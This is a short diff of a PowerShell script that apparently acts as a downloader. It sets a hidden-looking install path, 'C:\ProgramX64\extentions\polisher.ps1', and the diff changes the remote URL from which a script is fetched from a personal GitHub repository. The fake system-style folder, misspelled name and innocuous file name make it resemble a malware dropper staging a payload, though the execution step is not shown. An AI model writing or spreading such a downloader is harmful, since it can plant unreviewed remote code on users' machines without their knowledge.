@@ -1,7 +1,7 @@
 # Define the target directory and file path
 $directory = "C:\ProgramX64\extentions"
 $filePath = Join-Path $directory "polisher.ps1"
-$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/update"
+$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/update2"
 
 try {
     # Create the directory if it does not exist
